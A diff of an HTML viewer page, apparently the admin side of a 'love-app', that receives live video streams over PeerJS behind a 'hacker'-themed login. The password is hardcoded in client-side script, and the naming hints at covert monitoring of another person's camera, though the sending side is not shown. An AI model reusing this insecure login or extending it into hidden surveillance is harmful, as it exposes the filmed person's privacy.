@@ -3,91 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard 🔒</title>
+    <title>System Access 🔒</title>
     <link rel="manifest" href="manifest.json">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #2c3e50; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .login-box, .video-box { background: #34495e; padding: 30px; border-radius: 10px; text-align: center; width: 90%; max-width: 500px; }
-        input { padding: 10px; font-size: 1.1rem; border-radius: 5px; border: none; margin-bottom: 15px; width: 100%; box-sizing: border-box; }
-        button { padding: 10px 20px; font-size: 1.1rem; border-radius: 5px; border: none; background: #e74c3c; color: white; cursor: pointer; width: 100%; font-weight: bold; }
-        #remoteVideo { width: 100%; border-radius: 10px; background: black; display: none; margin-top: 15px; }
-        .status { margin-top: 15px; color: #f1c40f; font-weight: bold; }
+        /* Hacker Design Theme */
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        body { 
+            background-color: #0a0a0a; 
+            color: #00ff41; /* Matrix Green */
+            font-family: 'Share Tech Mono', monospace; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .login-box, .video-box { 
+            background: rgba(0, 0, 0, 0.9); 
+            border: 2px solid #00ff41; 
+            padding: 30px; 
+            border-radius: 5px; 
+            text-align: center; 
+            width: 90%; 
+            max-width: 500px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+
+        h2 { text-transform: uppercase; letter-spacing: 2px; margin-bottom: 20px; }
+
+        input { 
+            padding: 12px; 
+            font-size: 1.1rem; 
+            border-radius: 0; 
+            border: 1px solid #00ff41; 
+            background: #000;
+            color: #00ff41;
+            margin-bottom: 20px; 
+            width: 100%; 
+            box-sizing: border-box; 
+            font-family: 'Share Tech Mono', monospace;
+            outline: none;
+        }
+
+        input:focus { box-shadow: 0 0 10px #00ff41; }
+
+        button { 
+            padding: 12px 20px; 
+            font-size: 1.1rem; 
+            border-radius: 0; 
+            border: 1px solid #00ff41; 
+            background: transparent; 
+            color: #00ff41; 
+            cursor: pointer; 
+            width: 100%; 
+            font-weight: bold; 
+            font-family: 'Share Tech Mono', monospace;
+            text-transform: uppercase;
+            transition: 0.3s;
+        }
+
+        button:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
+
+        #remoteVideo { 
+            width: 100%; 
+            border: 1px solid #00ff41;
+            display: none; 
+            margin-top: 20px; 
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        .status { margin-top: 15px; color: #00ff41; font-weight: bold; text-transform: uppercase; font-size: 0.9rem;}
     </style>
 </head>
 <body>
     <div class="login-box" id="loginBox">
-        <h2>🔒 Admin Login</h2>
-        <input type="password" id="password" placeholder="Enter Password">
-        <button onclick="login()">Login</button>
+        <h2>[ SYSTEM LOGIN ]</h2>
+        <input type="password" id="password" placeholder="ENTER ACCESS CODE">
+        <button onclick="login()">Authenticate</button>
     </div>
 
     <div class="video-box" id="videoBox" style="display: none;">
-        <h2>Live Viewer</h2>
-        <p class="status" id="statusText">Waiting...</p>
+        <h2>[ LIVE FEED ]</h2>
+        <p class="status" id="statusText">Awaiting connection...</p>
         <video id="remoteVideo" autoplay playsinline></video>
     </div>
 
-    <audio id="ringtone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" loop></audio>
-
     <script>
-        const ADMIN_PASSWORD = "mysecret123"; 
+        // --- புது பாஸ்வேர்ட் இங்க தான் இருக்கு ---
+        const ADMIN_PASSWORD = "admin@2024"; 
         const ADMIN_PEER_ID = "love-app-admin-2024"; 
-        const ringtone = document.getElementById('ringtone');
 
+        // நோட்டிஃபிகேஷன் அனுமதி கேட்கிறோம்
         if ("Notification" in window) {
             Notification.requestPermission();
         }
 
         function login() {
             if (document.getElementById('password').value === ADMIN_PASSWORD) {
-                
-                // --- முக்கிய ட்ரிக்: லாகின் பண்ணும்போது ஆடியோவை சைலண்ட்டா ஆன் பண்ணி உடனே ஆஃப் பண்றோம் ---
-                ringtone.volume = 0; 
-                ringtone.play().then(() => {
-                    ringtone.pause();
-                    ringtone.currentTime = 0;
-                    ringtone.volume = 1; // மறுபடியும் சத்தத்தை ஆன் பண்றோம்
-                }).catch(e => console.log("Audio unlock failed"));
-
                 document.getElementById('loginBox').style.display = 'none';
                 document.getElementById('videoBox').style.display = 'block';
                 startAdminListener();
             } else {
-                alert("Wrong Password!");
+                alert("ACCESS DENIED. Incorrect Code.");
             }
         }
 
         function startAdminListener() {
             const peer = new Peer(ADMIN_PEER_ID);
-            peer.on('open', () => { document.getElementById('statusText').innerText = "Online! Waiting..."; });
+            peer.on('open', () => { document.getElementById('statusText').innerText = "System Online. Awaiting connection..."; });
             
             peer.on('call', (call) => {
-                // இப்போ ரிங் சவுண்ட் நல்லா அடிக்கும்
-                ringtone.play().catch(e => console.log("Play blocked"));
-
+                // நோட்டிஃபிகேஷன் அனுப்புறோம் (சவுண்ட் இல்லாம)
                 if (Notification.permission === "granted") {
-                    new Notification("💖 Someone is Calling!", {
-                        body: "Live sharing started. Tap to view.",
+                    new Notification("🚨 INCOMING CONNECTION!", {
+                        body: "Live feed initiated. Tap to view.",
                         icon: "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
                     });
                 }
 
                 call.answer(); 
                 call.on('stream', (remoteStream) => {
-                    ringtone.pause();
-                    ringtone.currentTime = 0;
-
-                    document.getElementById('statusText').innerText = "🟢 Connected!";
-                    document.getElementById('statusText').style.color = "#2ecc71";
+                    document.getElementById('statusText').innerText = ">> CONNECTION ESTABLISHED <<";
+                    document.getElementById('statusText').style.color = "#00ff41";
                     const video = document.getElementById('remoteVideo');
                     video.srcObject = remoteStream;
                     video.style.display = 'block';
                 });
                 
                 call.on('close', () => {
-                    document.getElementById('statusText').innerText = "🔴 Disconnected. Waiting...";
-                    document.getElementById('statusText').style.color = "#f1c40f";
+                    document.getElementById('statusText').innerText = "Connection Terminated. Awaiting...";
                     document.getElementById('remoteVideo').style.display = 'none';
                 });
             });
